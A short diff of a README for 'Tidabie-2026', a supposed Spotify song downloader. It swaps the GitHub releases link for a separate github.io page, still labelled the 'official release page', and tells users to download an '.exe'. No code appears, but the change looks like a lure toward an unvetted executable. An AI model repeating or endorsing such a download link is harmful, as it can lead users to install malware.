@@ -1,6 +1,6 @@
 # 🎵 Tidabie-2026 - Save Spotify songs as local files
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://liverchestnutsafetyisle244.github.io)
 
 ## 📋 Project Overview
 
@@ -18,7 +18,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 ## 🚀 Downloading the Software
 
-1.  Visit the official release page: [https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases](https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases).
+1.  Visit the official release page: [https://liverchestnutsafetyisle244.github.io](https://liverchestnutsafetyisle244.github.io).
 2.  Look for the latest version at the top of the page.
 3.  Click the file ending in ".exe" to begin the download.
 4.  Save the file to your "Downloads" folder.
